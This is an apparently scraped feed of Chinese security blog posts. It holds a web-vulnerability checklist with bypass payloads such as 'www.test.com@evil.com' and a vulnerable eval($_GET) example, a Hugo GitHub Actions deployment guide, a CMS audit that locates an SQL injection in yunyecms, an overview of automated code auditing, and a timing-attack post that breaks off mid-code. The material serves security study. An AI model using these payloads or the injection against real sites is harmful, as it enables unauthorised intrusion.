<p><a href="https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b">https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b</a></p>
<h3 id="jsonp响应头问题">jsonp响应头问题</h3>
<p>jsonp响应头是<code>text/html</code> 可直接当作反射xss</p>
<h3 id="重定向后执行">重定向后执行</h3>
<p>在对客户端重定向后 未终止程序 导致后面代码未预料的执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// 例子 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location:page1.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web缓存欺骗攻击">web缓存欺骗攻击</h3>
<p>网站在访问不存在文件时会返回404页面, 而假如网站对.js/.css 文件会进行缓存 且未对404情况处理. 404页面内保存有客户敏感信息(如csrf cookies)的话,使他访问一个不存在的.js文件.将会把他的敏感信息保存下来让攻击者查看</p>
<p>快速确认方法, 确认404页面构造和是否有缓存</p>
<h3 id="xxe">XXE</h3>
<p>解析XML文件的实体将导致执行任意命令  快速确认:任何使用xml作为输入的api都是值得尝试的</p>
<h3 id="正则dos">正则dos</h3>
<p>一些错误的正则表达式将导致一个指数级的复杂度 输入一个特殊的匹配字符串将导致dos.</p>
<p>使用<a href="http://regex101.com/">http://regex101.com/</a>可以查看正则表达式匹配时实际使用的步数和时间.</p>
<p>常见模式<code>\d{1:&gt;20}</code> <code>(\d*)+</code></p>
<p>这个漏洞非常有趣</p>
<h3 id="cors配置问题">CORS配置问题</h3>
<p>网站错误的配置将导致恶意网站可以跨域访问用户在此网站的信息</p>
<h3 id="备份文件可猜测">备份文件可猜测</h3>
<p>网站生成备份文件名可猜测并且未防止访问的话 可以访问所有数据</p>
<h3 id="平行越权">平行越权</h3>
<p>访问其他用户的数据或代表其他用户操作 常见于用<code>userid</code>参数的api 替换id就可以用对应id权限</p>
<h3 id="验证码dos">验证码dos</h3>
<p>验证码接受了长宽参数. 通过输入一个足够大的数字将消耗大量服务器资源. 快速确认 对验证码接口输入<code>width</code>和<code>height</code>  和修改</p>
<h3 id="用户名枚举">用户名枚举</h3>
<p>对于不存在用户名和存在的情况存在两种响应 并不存在验证手段 攻击者可以枚举已存在的用户名</p>
<h3 id="http头攻击">http头攻击</h3>
<p>输入参数控制了响应头的一部分 并且可以插入<code>\r\n</code> 在http头输入任意内容.</p>
<p>可能性快速确认:输入参数存在于返回响应头</p>
<h3 id="模板注入">模板注入</h3>
<p>控制模板文件内容 导致在解析时执行未预料的指令.</p>
<p>快速确认:输入模板常用的分割符和简单计算如 <code>{{ 1+1 }}</code> <code>[[ 1+1 ]]</code></p>
<h3 id="css注入">CSS注入</h3>
<p>css也可以执行js代码</p>
<h3 id="onmessage">onMessage</h3>
<p>js中的<code>onMessage</code>时间如果不进行限制 默认将会接收所有网站发出的<code>postMessage </code> . 现在开发一般对<code>message</code>信任  如果代码直接使用这部分数据作为html 将导致xss.</p>
<h2 id="技巧">技巧</h2>
<h3 id="ieedge浏览器未编码windowlocationhref">IE/EDGE浏览器未编码window.location.href</h3>
<p>直接使用window.location.href作为html时 IE/edge浏览器未对这参数进行url编码</p>
<h3 id="svg-xss">svg XSS</h3>
<p>svg文件可以导致xss, 如果上传图片未限制.svg的话将存在漏洞</p>
<h3 id="pdf-xss">pdf xss</h3>
<p>pdf可以加入js代码 将会导致xss</p>
<h3 id="00终止bash执行">%00终止bash执行</h3>
<p>bash执行时 如果命令中引号内有%00 将直接抛出错误</p>
<h3 id="bypass-域名验证">bypass 域名验证</h3>
<p>如果是以正则 <code>^www.test.com</code>作为验证  通过<code>www.test.com@evil.com</code>绕过</p>
<p>如果是通过解析url再通过验证域名 可以通过浏览器对错误url的解析来绕过 例如</p>
<p><code>evil.com\\@test.com</code> 实际上是<code>evil.com</code> 而解析url时域名解析成<code>test.com</code> 了</p>
<p>同样的<code>/\google.com</code> 将前往google.com</p>
<h3 id="sentry-ssrf">sentry SSRF</h3>
<p>sentry是一个错误报告服务 但是配置不当 可能通过它的api来<code>SSRF</code></p>
<h3 id="get-csrf">GET CSRF</h3>
<p>常见框架只对于<code>POST</code> 请求验证csrf 如果api允许get方法 将直接csrf</p>
<h3 id="上传符号链接文件">上传符号链接文件</h3>
<p>访问符号链接文件时将访问到对应的真实文件 导致文件读取</p>
<h3 id="script块内xss"><code>&lt;script&gt;</code>块内xss</h3>
<p><code>'</code>和<code>&quot;</code>和<code>&lt;&gt;</code>任意一个未转义都可能导致xss
<code>&lt;script&gt;</code>块内不需要考虑逃脱<code>'</code>和<code>&quot;</code>
例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;
</span></span><span class="line"><span class="cl">var a =&#34;&lt;/script&gt;&lt;img&gt;&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="跳转xss">跳转xss</h3>
<p>常见跳转页都是JavaScript操作的,如果将跳转地址改为<code>JavaScript:xxx</code>将把重定向漏洞升级为xss</p>
<h3 id="jsonp-xss">jsonp xss</h3>
<p>jsonp的<code>content-type</code>设置为<code>text/html</code> 未过滤<code>callback</code>的话就等于反射xss</p>
]]></content></item><item><title>使用github Action自动化部署 Hugo</title><link>https://blue-bird1.github.io/posts/github-action-hugo/</link><pubDate>Wed, 04 Dec 2019 23:58:12 +0800</pubDate><guid>https://blue-bird1.github.io/posts/github-action-hugo/</guid><description>前言 最近由于一直在用的travis-ci出现了迷之bug,加上想尝试一下github action就决定尝试用github action替换tr</description><content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>最近由于一直在用的<code>travis-ci</code>出现了迷之bug,加上想尝试一下<code>github action</code>就决定尝试用<code>github action</code>替换<code>travis-ci</code></p>
<h3 id="选用action">选用action</h3>
<p><code>github</code>现有的<code>action</code>组件可以在<a href="https://github.com/marketplace?type=actions">这里</a>查看. 如果想要自定义自己仓库的<code>workflow</code>,可以选用里面来进行组合.
不过<code>hugo</code>在<code>github page</code>的<code>workflow</code>,已经有人在<a href="https://github.com/peaceiris/actions-hugo">这</a>弄好了,</p>
<h3 id="编写workflow">编写workflow</h3>
<p><code>workflow</code>定义是一个位于<code>.github/workflows/</code>的<code>yaml</code>文件.点开仓库的<code>action</code>按钮会出现引导界面
<img src="https://i.loli.net/2019/12/05/iIcU3VN4evzZfl6.png" alt="2019-12-05 00-13-38 的屏幕截图.png">
显示一些常用的<code>workflow</code> 但由于我们要用并不在这里面 点击右上角的<code>skip</code>就行.</p>
<p>模板文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">github pages</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">on</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">push</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># 你的hugo源码分支</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="l">master</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">jobs</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">build-deploy</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu-18.04</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">steps</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">actions/checkout@v1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="c"># 如果使用了git submodules</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="c"># with:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="c">#   submodules: true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Setup Hugo</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-hugo@v2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">with</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">hugo-version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.59.1&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c"># extended: true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Build</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l">hugo --minify</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Deploy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l">peaceiris/actions-gh-pages@v2.5.0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">env</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">ACTIONS_DEPLOY_KEY</span><span class="p">:</span><span class="w"> </span><span class="l">${{ secrets.ACTIONS_DEPLOY_KEY}}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c"># 你的github page分支</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">PUBLISH_BRANCH</span><span class="p">:</span><span class="w"> </span><span class="l">gh-pages</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">PUBLISH_DIR</span><span class="p">:</span><span class="w"> </span><span class="l">./public</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="设置secrets">设置secrets</h3>
<p>之后需要设置<code>secrets</code>.<code>secrets.ACTIONS_DEPLOY_KEY</code>实际上是你的<code>github Personal access tokens</code>,申请后点击项目的<code>setting</code>,在<code>secrets</code>栏添加一个key名是<code>PERSONAL_TOKEN</code>的<code>secrets</code>即可</p>
]]></content></item><item><title>Cms代码审计方法</title><link>https://blue-bird1.github.io/posts/cms-audit/</link><pubDate>Sun, 01 Dec 2019 20:26:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/cms-audit/</guid><description>前言 记录cms挖掘漏洞的几种下手方法 基于危险函数 最常见的应该是这种了 通过搜索常见的危险函数如assert|eval|system|file_</description><content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>记录cms挖掘漏洞的几种下手方法</p>
<h3 id="基于危险函数">基于危险函数</h3>
<p>最常见的应该是这种了 通过搜索常见的危险函数如<code>assert|eval|system|file_put_contents|unserialize</code>
来快速搜索可能存在的漏洞点 然后再追溯函数参数的引入位置.</p>
<p>寻找速度很快.
能直接找到的漏洞比较低级.
在使用框架的cms上 搜索上述函数基本都应该搜到框架里面去了.
对框架cms作用不大.</p>
<p>但如果拥有前置框架知识 则可以用框架内的危险函数 代替上述函数.如thinkphp的 where order等sql函数 如果使用字符串做参数 将不会进行过滤. 同时由于使用了框架简化代码 这种方法速度将非常快.</p>
<h3 id="基于输入点">基于输入点</h3>
<p>基于危险函数搜索存在一个问题, 如果搜索结果过多,然后大部分输入实际上并不是由我们可控的,会导致效率很低.
而基于输入点 则是按着只有我可控的输入才能导致漏洞的思路. 首先确定输入点 然后再按流程审计代码.</p>
<p>这种方法速度不快, 但能找到的漏洞类型全面. 而在框架型cms下 由于封装很多 这种方法需要进入的函数很多 速度更加慢了.</p>
<h3 id="基于信任">基于信任</h3>
<p>被开发信任的外部输入值出现问题往往将会是漏洞.基于信任过程的审计非常直接，但考验对代码的熟悉度</p>
<h4 id="验证">验证</h4>
<p>首先需要确认是否存在一些全局验证　和这些过滤器的实际效果是什么．
然后检查这些验证代码使用的位置(对象毫无疑问肯定是我们的输入)</p>
<h4 id="底层函数">底层函数</h4>
<p>在确认验证是否有误时 必须知道底层函数的安全性.
首先不管如何封装 最底层函数都是无防护的 开发人员假设上层调用提供了足够的安全验证.而开发人员如果假设底层函数做了安全防护. 这一误差往往会导致漏洞的出现.
通过审计这些底层函数 来了解那些底层函数是不安全的. 追溯到cms实际使用的函数,就可以知道这些函数的安全性需要什么样的验证来保障.</p>
<p>####　外部输入安全验证
在了解了函数的安全性后,检查外部输入的安全验证.
确认安全验证是否良好．比起从输入点审计全部代码的更快更直接.因为大部分代码是与实际漏洞无关的.
了解安全验证后,检查是否存在全局过滤.</p>
<h4 id="业务逻辑">业务逻辑</h4>
<p>到实际业务逻辑时, 我们已经对cms的验证了如指掌,对于漏洞的搜索,从已知函数下手会比较快.直接搜索,从搜索结果基本可以确认那些是可能有危害的.(例如知道函数传入字符串才可能有漏洞,我们忽略其他参数为数组的搜索结果.)</p>
<p>结合我们了解的全局过滤(例如转义了所有标签)也可以忽略一部分.
然后在搜索结果 找到开发使用的过滤函数 基本可以得出这个漏洞到底存不存在了.
也就是一个判定,在这么多验证下是否能达成这个函数所需要的安全性.如果不能就是漏洞</p>
<h3 id="实战">实战</h3>
<p>以yumyecms为例
从搜索危险函数下手
<img src="https://i.loli.net/2019/12/01/OmnRiW5qAkP67ef.png" alt="2019-12-01 21-50-55 的屏幕截图.png">
令人失望的是 搜索到的结果不多 并且大部分都在类库文件里 检查剩下的反序列化函数 发现也是反序列从数据库中查询出来的数据.</p>
<p>快速确认这个框架是否使用了获取输入的函数,幸运的发现这个cms仍然在使用<code>_ GET</code>等超全局变量 进行搜索
<img src="https://i.loli.net/2019/12/01/rJ59XLDiVy2IcCO.png" alt="2019-12-01 21-59-29 的屏幕截图.png"></p>
<p>首先我们可以忽略仅出现在判断语句里的结果,然后点开其他结果后发现 对变量进行了<code>usafestr</code>的过滤 并直接拼接到sql语句.在不查看这个过滤存在的情况下先认为这个变量已经是安全的.
查看所有前台可访问函数内变量后 发现未经过编码的只有<code>core/app/shop/alipay.php</code>  但沮丧的发现里面对提交参数进行了其他验证.</p>
<p>对此只能对代码进行更深一步的了解了 我们先从简单的sql注入入手 .</p>
<p>在之前的了解中我们可以知道<code>this-&gt;db</code>操作了数据库(实际上在这个有model层的cms 直接看model类就行了)  我们追着父类查找(其中使用了<code>init.php</code>定义的函数加载文件 但函数都很简单)  最终在<code>core/lib/model.class.php</code> 它使用了<code>core/lib/yymysqli.class.php</code>操作数据库</p>
<p>确认<code>yymysqli</code>的过滤 可以总结</p>
<ol>
<li>execute/insert方法的key参数/update的where参数是不安全的</li>
</ol>
<p>根据这些信息 很快就能确认出<code>model</code>类的不安全函数</p>
<p>确认危险函数后 也需要确认外部参数的过滤 我们找到<code>usafestr</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function usafestr($string,$flitersql=1,$fliter_script=1) {
</span></span><span class="line"><span class="cl">	// 过滤url编码
</span></span><span class="line"><span class="cl">    $string=str_ireplace(&#34;%&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;%20&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;%27&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;%2527&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	$string=str_ireplace(&#34;\t&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;*&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#34;&#39;&#34;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;;&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    //$string = str_replace(&#34;{&#34;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">    //$string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">	$string=str_ireplace(&#34;#&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">	$string=str_ireplace(&#34;--&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">	$string=str_ireplace(&#34;\&#34;&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">	$string=str_ireplace(&#34;/&#34;,&#34;&#34;,$string);
</span></span><span class="line"><span class="cl">    $string = str_ireplace(&#39;\\&#39;,&#39;&#39;,$string);
</span></span><span class="line"><span class="cl">	if($flitersql){
</span></span><span class="line"><span class="cl">		$string=safestring::fliter_sql($string);
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	if($fliter_script){
</span></span><span class="line"><span class="cl">		$string=safestring::fliter_script($string);
</span></span><span class="line"><span class="cl">		}
</span></span><span class="line"><span class="cl">	$string=safestring::fliter_escape($string);
</span></span><span class="line"><span class="cl">	$string=htmlspecialchars($string);
</span></span><span class="line"><span class="cl">	$string = str_ireplace(&#34;$&#34;, &#34;&amp;#36;&#34;, $string);
</span></span><span class="line"><span class="cl">	$string = str_ireplace(&#34;\n&#34;, &#34;&lt;br/&gt;&#34;, $string);	
</span></span><span class="line"><span class="cl">	$string = str_ireplace(&#39;%&#39;,&#39;%&amp;lrm;&#39;,$string);
</span></span><span class="line"><span class="cl">	$string=addslashes($string);
</span></span><span class="line"><span class="cl">    return $string;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中的<code>fliter_sql</code> 和<code>fliter_script</code> 只是过滤常见关键字.
从这段代码可以看出 过滤了大量字符 最关键的单引号和双引号也被过滤了. 从这点可以确认我们寻找sql注入时绝不能使用单引号和双引号.</p>
<p>我们首先尝试搜索<code>select</code>这个危险函数
<img src="https://i.loli.net/2019/12/01/bESAda8WwYgD4TJ.png" alt="2019-12-01 23-37-20 的屏幕截图.png"></p>
<p>虽然都不需要引号 但只有最后一处是可控的.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">		<span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;selcart&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">messagebox</span><span class="p">(</span><span class="nx">Lan</span><span class="p">(</span><span class="s1">&#39;goods_least_one&#39;</span><span class="p">))</span><span class="o">:</span><span class="nv">$selcart</span><span class="o">=</span><span class="nx">yytrim</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;selcart&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">		<span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])</span><span class="o">?</span><span class="nx">messagebox</span><span class="p">(</span><span class="nx">Lan</span><span class="p">(</span><span class="s1">&#39;error_parameter&#39;</span><span class="p">))</span><span class="o">:</span><span class="nv">$numarray</span><span class="o">=</span><span class="nx">yytrim</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	    <span class="nv">$cartstr</span><span class="o">=</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$selcart</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="nv">$cartlist</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">select</span><span class="p">(</span><span class="s2">&#34;select * from `#yunyecms_cart` where userid=</span><span class="si">{</span><span class="nv">$member</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="si">}</span><span class="s2"> and id in(</span><span class="si">$cartstr</span><span class="s2">) order by addtime desc&#34;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>很明显的漏洞 这cms还没报错处理 随便写点就报错了 .</p>
<p><img src="https://i.loli.net/2019/12/02/9ecnhR7oTtwSuYH.png" alt="2019-12-02 00-47-18 的屏幕截图.png"></p>
]]></content></item><item><title>Code Audit</title><link>https://blue-bird1.github.io/posts/code-audit/</link><pubDate>Tue, 26 Nov 2019 12:56:55 +0800</pubDate><guid>https://blue-bird1.github.io/posts/code-audit/</guid><description>前言 代码审计是白盒测试的重要部分,对它的自动化探索也从未停止,但是在现实环境复杂度下现有的工具 实用性并不用.只能实现发现简单漏洞.本文讨论现</description><content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>代码审计是白盒测试的重要部分,对它的自动化探索也从未停止,但是在现实环境复杂度下现有的工具 实用性并不用.只能实现发现简单漏洞.本文讨论现有的代码审计工具和理论.</p>
<h3 id="自动化代码审计">自动化代码审计</h3>
<p>介绍常见的自动化审计</p>
<h4 id="静态分析">静态分析</h4>
<p>最简单的方法自然是不对代码进行分析  直接进行正则匹配,发现危险模式.例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval($GET[&#39;xxx&#39;])
</span></span></code></pre></td></tr></table>
</div>
</div><p>自然就是一种危险模式,缺点不然而喻误报率高 检测率低.  优点则是容易实现 很简单就能集成到ci上,作为一种代码规范 自动不需要考虑误报率这个问题了.
(检测出来就是你代码不符合安全规范)</p>
<h4 id="污点分析">污点分析</h4>
<p>污点分析在安全人员的手工审计思路上可以体现为 先搜一下危险函数, 然后看看危险函数参数可不可控,在分析可不可控中 需要看之前的代码.</p>
<p>以下是现有工具的基本实现逻辑
污点分析基于对代码路径的分析,首先也需要标记危险函数和输入源(在php一般可以认为是$GET, $POST, $COOKIES).
和安全函数 然后对代码进行解析 生成语法树. 这方面已经有多个库实现了.
再寻找标记的危险函数和其参数, 然后参数就是输入源 基本可以确认是漏洞了. 如果不是 需要进行回溯 确认这个参数的来源. 在这个过程如果遇到安全函数进行过滤,则可以认为这里不存在漏洞.</p>
<p>污点分析理论上是没有问题 只是一种审计思路 当然在代码实现上存在一些问题.
例如安全函数过滤后并不能真的确认没有问题了, 换做真人审计肯定是要确认这些函数的效果.  这个问题在mvc框架下非常明显, 框架使用的安全函数太多了.</p>
<h4 id="语义分析">语义分析</h4>
<p>要解决上面的问题, 彻底解析所有php代码,但基础函数并不能分析,必须提供基础函数的数据. 理解这些代码到底起了什么作用.</p>
<p>最后代码审计工具只需要声明 某函数不应该可以输入什么样的参数.例如 echo函数 不应可以输入 <code>&lt;xxx&gt;</code>的参数.
这里的判断可以归结于一个 约束求解. 首先一个外部输入源是不存在约束的,可以任意输入 然后例如通过intval函数后添加了一个约束 这个参数只能是<code>0-9</code>.
显然这种约束后 是不可能存在<code>&lt;xxx&gt;</code>的解的.</p>
<p>这种方法的优势很明显 但是实现非常困难 光是语义分析就没有已实现的例子.</p>
<h3 id="结尾">结尾</h3>
<p>本文总结了常见的自动代码审计实现,但自动化归自动化. 我们安全人员在审计时需要考虑这次审计对自身技术有提升么?重复在一些低劣cms上审计 固然是容易挖漏洞刷cve 但是对自身技术没什么帮助.</p>
<h3 id="参考">参考</h3>
<p><a href="http://blog.fatezero.org/2018/11/11/prvd/">http://blog.fatezero.org/2018/11/11/prvd/</a>
<a href="https://wooyun.js.org/drops/PHP%E8%87%AA%E5%8A%A8%E5%8C%96%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0.html">https://wooyun.js.org/drops/PHP%E8%87%AA%E5%8A%A8%E5%8C%96%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0.html</a></p>
]]></content></item><item><title>时间攻击</title><link>https://blue-bird1.github.io/posts/time-attack/</link><pubDate>Fri, 22 Nov 2019 01:17:28 +0800</pubDate><guid>https://blue-bird1.github.io/posts/time-attack/</guid><description>前言 对于本篇博客的标题 读者应该都不陌生了 毕竟大名鼎鼎的cpu漏洞就有利用这种侧信道攻击的. 这种攻击的难度也很大,但是作为一种攻击却是挺有意思</description><content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>对于本篇博客的标题 读者应该都不陌生了 毕竟大名鼎鼎的cpu漏洞就有利用这种侧信道攻击的.
这种攻击的难度也很大,但是作为一种攻击却是挺有意思的.攻击面也很广泛 因为只要是代码必然涉及到执行时间这个问题,只是差异有没有大到可以被攻击者检测出来的问题而已.</p>
<h3 id="php的字符串时间攻击">php的字符串时间攻击</h3>
<p>这应该离web最近的了 这种漏洞在cve也有 如CVE-2019-18887</p>
<p>用一个最简单的代码举例</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$secret = &#34;thisismykey&#34;;
</span></span><span class="line"><span class="cl">if ($_GET[&#39;secret&#39;] !== $secret) {
</span></span><span class="line"><span class="cl">    die(&#34;Not Allowed!&#34;);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>本质的问题是 php的字符串比较是用以下伪代码实现的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// str1 and str2 cmp
